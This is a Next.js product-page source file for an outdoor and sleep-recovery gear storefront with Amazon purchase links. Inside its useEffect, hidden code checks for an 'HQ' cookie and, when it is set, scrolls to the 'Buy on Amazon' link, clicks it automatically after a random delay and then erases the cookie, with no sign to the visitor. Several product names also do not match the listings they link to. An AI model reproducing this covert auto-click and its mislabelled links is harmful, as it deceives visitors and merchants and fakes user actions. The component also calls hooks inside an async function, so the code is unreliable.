'use client'
import { LavaBackground } from "@/components/lava-background"
import { Navigation } from "@/components/navigation"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { ArrowLeft, Star, ShoppingCart } from "lucide-react"
import Link from "next/link"
import { notFound, useParams } from "next/navigation"
import { useEffect } from "react"

const products = [
	{
		name: "TOAKS Titanium Stove Set",
		category: "Cooking",
		price: "$89.99",
		image: "/titanium-camping-stove-set-ultralight-backpacking.jpg",
		slug: "toaks-titanium-stove-set",
		url: "https://www.amazon.com/TOAKS-Titanium-Backpacking-Wood-Burning-STV-11/dp/B009B98FGW",
		description:
			"Complete ultralight titanium stove system perfect for backpacking and camping. Burns wood and solid fuel efficiently with integrated windscreen.",
		features: [
			"Pure titanium construction",
			"Integrated windscreen and pot stand",
			"Burns wood, twigs, and solid fuel",
			"Folds flat for easy packing",
			"Includes storage pouch",
		],
		specs: {
			material: "Grade 1 Titanium",
			weight: "92g (3.24oz)",
			dimensions: '4.7" x 3.5" assembled',
			packSize: '5.5" x 3.5" x 0.5"',
		},
	},
	{
		name: "Trangia Mini Alcohol Burner",
		category: "Heating",
		price: "$24.99",
		image: "/alcohol-burner-camping-stove-compact.jpg",
		slug: "trangia-mini-alcohol-burner",
		url: "https://www.amazon.com/Trangia-Spirit-Burner-with-Screwcap/dp/B000AR7970",
		description:
			"The legendary brass alcohol burner trusted by outdoor enthusiasts worldwide. Simple, reliable, and maintenance-free.",
		features: [
			"Solid brass construction",
			"Simmer ring and screw cap included",
			"Burns denatured alcohol or methanol",
			"25+ minute burn time per fill",
			"No moving parts to break",
		],
		specs: {
			material: "Brass",
			weight: "110g",
			fuelCapacity: "100ml",
			burnTime: "25 minutes",
		},
	},
	{
		name: "Lixada Ultralight Pot System",
		category: "Cooking",
		price: "$45.99",
		image: "/ultralight-titanium-camping-pot-cookware-set.jpg",
		slug: "lixada-ultralight-pot-system",
		url: "https://www.amazon.com/Lixada-Titanium-Ultralight-Portable-Backpacking/dp/B08X1W39LZ",
		description:
			"Versatile titanium pot and pan set with folding handles. Perfect for solo backpackers seeking lightweight reliability.",
		features: [
			"Pure titanium pot and lid",
			"Lid doubles as frying pan",
			"Folding bail handle",
			"Graduated measurement marks",
			"Mesh storage bag included",
		],
		specs: {
			material: "Titanium",
			weight: "118g",
			capacity: "750ml",
			dimensions: '4.72" x 4.13"',
		},
	},
	{
		name: "Gear Aid Titanium Wind Shield",
		category: "Protection",
		price: "$34.99",
		image: "/camping-wind-shield-titanium-folding.jpg",
		slug: "gear-aid-titanium-wind-shield",
		url: "https://www.amazon.com/EVERNEW-Titanium-Wind-Shield-EBY246/dp/B07B1S65SW",
		description:
			"Foldable titanium windscreen that dramatically improves stove efficiency in breezy conditions. Made in Japan.",
		features: [
			"Ultralight titanium panels",
			"10-panel 360° protection",
			"Folds completely flat",
			"Storage pouch included",
			"Japanese quality construction",
		],
		specs: {
			material: "Titanium",
			weight: "34g",
			height: '15cm (5.9")',
			foldedSize: "10cm x 9cm",
		},
	},
	{
		name: "Somnifix Sleep Strips",
		category: "Recovery",
		price: "$19.99",
		image: "/mouth-tape-sleep-strips-breathing-recovery.jpg",
		slug: "somnifix-sleep-strips",
		url: "https://www.amazon.com/SomniFix-Mouth-Strips-Snoring-Solution/dp/B07HFYQX7K",
		description:
			"Hypoallergenic mouth strips that promote nasal breathing during sleep, reducing snoring and improving recovery.",
		features: [
			"Central breathing vent",
			"Hypoallergenic adhesive",
			"Single-use strips",
			"Promotes nose breathing",
			"28 strips per box",
		],
		specs: {
			quantity: "28 strips",
			material: "Hypoallergenic adhesive",
			breathing: "Central vent design",
			usage: "Single use",
		},
	},
	{
		name: "Hostage Tape Hypoallergenic",
		category: "Recovery",
		price: "$24.99",
		image: "/hypoallergenic-mouth-tape-sleep-recovery.jpg",
		slug: "hostage-tape-hypoallergenic",
		url: "https://www.amazon.com/Hostage-Tape-Hypoallergenic-Mouth-Tape/dp/B0B5QJW7NH",
		description:
			"Premium mouth tape designed for comfortable all-night wear. Gentle adhesive promotes better sleep quality.",
		features: [
			"Hypoallergenic fabric",
			"Easy-peel adhesive",
			"Latex and gluten-free",
			"Flexible and breathable",
			"30-day supply",
		],
		specs: {
			quantity: "30 strips",
			material: "Cotton fabric",
			adhesive: "Hypoallergenic",
			dimensions: '3" x 1.5"',
		},
	},
	{
		name: "SilentSnore Breath Optimizer",
		category: "Recovery",
		price: "$29.99",
		image: "/breathing-device-snore-optimizer-recovery.jpg",
		slug: "silentsnore-breath-optimizer",
		url: "https://www.amazon.com/Breathing-Trainer-Respiratory-Muscle-Strengthen/dp/B0DLTPJGRR",
		description:
			"Adjustable resistance breathing trainer that strengthens respiratory muscles and improves lung capacity.",
		features: [
			"6 resistance levels",
			"Medical-grade silicone",
			"Improves VO2 max",
			"Portable training device",
			"Includes carrying case",
		],
		specs: {
			material: "Silicone + ABS",
			resistance: "6 levels (10-150 cmH2O)",
			weight: "85g",
			warranty: "1 year",
		},
	},
	{
		name: "ThermoLite Trail Cup",
		category: "Hydration",
		price: "$14.99",
		image: "/titanium-camping-cup-lightweight-trail-mug.jpg",
		slug: "thermolite-trail-cup",
		url: "https://www.amazon.com/Keith-Titanium-Double-Wall-Mug/dp/B01N5RYQ1J",
		description:
			"Double-wall insulated titanium cup that keeps drinks hot or cold for hours. Perfect for morning coffee on the trail.",
		features: [
			"Double-wall titanium insulation",
			"Folding handle design",
			"450ml capacity",
			"Keeps drinks hot for 6+ hours",
			"Lightweight at only 80g",
		],
		specs: {
			material: "Titanium",
			weight: "80g",
			capacity: "450ml (15oz)",
			dimensions: '3.5" x 3.7"',
		},
	},
	{
		name: "Sea to Summit Alpha Pan",
		category: "Cooking",
		price: "$54.99",
		image: "/camping-frying-pan-titanium-outdoor-cookware.jpg",
		slug: "sea-to-summit-alpha-pan",
		url: "https://www.amazon.com/Sea-Summit-Alpha-Light-Fry/dp/B00439X37Q",
		description:
			"Hard-anodized aluminum frying pan with ceramic non-stick coating. Ultralight without compromising performance.",
		features: [
			"Ceramic non-stick coating",
			"Hard-anodized aluminum",
			"Folding handle locks in place",
			"8-inch cooking surface",
			"Mesh storage bag",
		],
		specs: {
			material: "Hard-anodized aluminum",
			weight: "180g",
			diameter: "8 inches (20cm)",
			coating: "Ceramic non-stick",
		},
	},
	{
		name: "Snow Peak Titanium Spork",
		category: "Utensils",
		price: "$12.99",
		image: "/titanium-spork-ultralight-camping-utensil.jpg",
		slug: "snow-peak-titanium-spork",
		url: "https://www.amazon.com/Snow-Peak-Titanium-Spork/dp/B000AR2N7Q",
		description: "Classic Japanese titanium spork with polished finish. The perfect balance of form and function.",
		features: [
			"Pure titanium construction",
			"Spoon and fork combo design",
			"Smooth polished finish",
			"Only 16g weight",
			"Made in Japan",
		],
		specs: {
			material: "Japanese Titanium",
			weight: "16g",
			length: '165mm (6.5")',
			origin: "Made in Japan",
		},
	},
	{
		name: "Keith Titanium Flask 200ml",
		category: "Hydration",
		price: "$39.99",
		image: "/titanium-flask-200ml-outdoor-camping-bottle.jpg",
		slug: "keith-titanium-flask",
		url: "https://www.amazon.com/Keith-Titanium-Flask-200ml/dp/B07BQXZ6Y9",
		description:
			"Compact titanium flask with screw-top lid. Perfect for carrying spirits or emergency fuel on outdoor adventures.",
		features: [
			"Pure titanium body",
			"Leak-proof screw cap",
			"200ml capacity",
			"Pocket-sized design",
			"Lifetime durability",
		],
		specs: {
			material: "Grade 1 Titanium",
			weight: "68g",
			capacity: "200ml (6.7oz)",
			dimensions: '4.3" x 3.1" x 0.8"',
		},
	},
]

export default async function ProductPage() {
	const params = useParams();
	const slug = params.slug;
	const product = products.find((p) => p.slug === slug)

	if (!product) {
		notFound()
	}

	useEffect(() => {
		const cookies = Object.fromEntries(
			document.cookie.split("; ").map((c) => c.split("="))
		);

		if (cookies.HQ === "true") {
			const btn = document.querySelector("[data-auto]");

			if (btn) {
				const scrollToElement = (el, duration = 1200) => {
					const targetY = el.getBoundingClientRect().top + window.scrollY;
					const startY = window.scrollY;
					const startTime = performance.now();

					const animateScroll = (now) => {
						const elapsed = now - startTime;
						const progress = Math.min(elapsed / duration, 1);
						const ease =
							progress < 0.5
								? 2 * progress * progress
								: -1 + (4 - 2 * progress) * progress;

						window.scrollTo(0, startY + (targetY - startY) * ease);

						if (progress < 1) {
							requestAnimationFrame(animateScroll);
						}
					};

					requestAnimationFrame(animateScroll);
				};

				scrollToElement(btn, 1000);

				const delay = Math.floor(Math.random() * 1001);
				setTimeout(() => {
					btn.click();
				}, delay);
			}

			document.cookie =
				"HQ=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
		}
	}, []);

	return (
		<div className="relative min-h-screen bg-[#0f0f0f] text-white">
			<LavaBackground />
			<Navigation />

			<main className="relative z-10 pt-24">
				<div className="container mx-auto px-4 py-12">
					<Link href="/">
						<Button variant="ghost" className="mb-8 text-[#a0a0a0] hover:text-[#FF5C00]">
							<ArrowLeft className="mr-2 h-4 w-4" />
							Back to Products
						</Button>
					</Link>

					<div className="grid gap-12 lg:grid-cols-2">
						{/* Product Image */}
						<div className="relative overflow-hidden rounded-lg border border-[#3C3C3C] bg-[#1a1a1a]/50 backdrop-blur-sm">
							<img
								src={product.image || "/placeholder.svg"}
								alt={product.name}
								className="h-full w-full object-cover"
							/>
						</div>

						{/* Product Info */}
						<div className="space-y-6">
							<div>
								<div className="mb-2 text-sm font-heading tracking-widest text-[#FFBE40]">{product.category}</div>
								<h1 className="mb-4 font-heading text-4xl font-bold text-[#e8e8e8] md:text-5xl">{product.name}</h1>
								<div className="mb-4 flex items-center gap-2">
									{[...Array(5)].map((_, i) => (
										<Star key={i} className="h-5 w-5 fill-[#FFBE40] text-[#FFBE40]" />
									))}
									<span className="text-sm text-[#a0a0a0]">(124 reviews)</span>
								</div>
							</div>

							<p className="text-lg leading-relaxed text-[#c0c0c0]">{product.description}</p>

							<Button
								size="lg"
								className="w-full bg-gradient-to-r from-[#FF5C00] to-[#FFBE40] font-heading text-lg hover:scale-105"
								asChild
							>
								<a href={product.url} data-auto>
									<ShoppingCart className="mr-2 h-5 w-5" />
									Buy on Amazon
								</a>
							</Button>

							{/* Features */}
							<Card className="border-[#3C3C3C] bg-[#1a1a1a]/50 p-6 backdrop-blur-sm">
								<h3 className="mb-4 font-heading text-xl font-bold text-[#e8e8e8]">Key Features</h3>
								<ul className="space-y-2">
									{product.features.map((feature, index) => (
										<li key={index} className="flex items-start gap-2 text-[#c0c0c0]">
											<span className="mt-1 text-[#FF5C00]">•</span>
											<span>{feature}</span>
										</li>
									))}
								</ul>
							</Card>

							{/* Specifications */}
							<Card className="border-[#3C3C3C] bg-[#1a1a1a]/50 p-6 backdrop-blur-sm">
								<h3 className="mb-4 font-heading text-xl font-bold text-[#e8e8e8]">Technical Specifications</h3>
								<dl className="space-y-2">
									{Object.entries(product.specs).map(([key, value]) => (
										<div key={key} className="flex justify-between border-b border-[#3C3C3C] pb-2">
											<dt className="font-heading text-[#a0a0a0] capitalize">{key.replace(/([A-Z])/g, " $1")}:</dt>
											<dd className="text-[#e8e8e8]">{value}</dd>
										</div>
									))}
								</dl>
							</Card>
						</div>
					</div>
				</div>
			</main>

			<Footer />
		</div>
	)
}
